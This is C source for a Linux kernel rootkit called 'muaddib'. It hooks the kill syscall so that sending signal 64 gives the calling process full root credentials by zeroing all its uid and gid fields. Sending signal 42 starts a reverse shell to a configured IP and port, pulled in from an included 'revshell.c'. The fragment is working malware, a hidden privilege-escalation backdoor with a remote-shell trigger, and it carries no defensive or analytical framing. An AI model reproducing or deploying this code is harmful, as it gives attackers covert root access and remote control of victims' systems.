#include "revshell.c"

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*og_kill)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused)
 * and then call the set_root() function. */
asmlinkage int muaddib_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "muaddib: giving root\n");
        set_root();
        return 0;
    }

    else if (sig == 42){
        printk(KERN_INFO "muaddib: starting reverse shell\n");
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    }

    return og_kill(regs);

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*og_kill)(pid_t pid, int sig);

static asmlinkage int muaddib_kill(pid_t pid, int sig)
{
    void set_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return og_kill(pid, sig);
}
#endif

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}
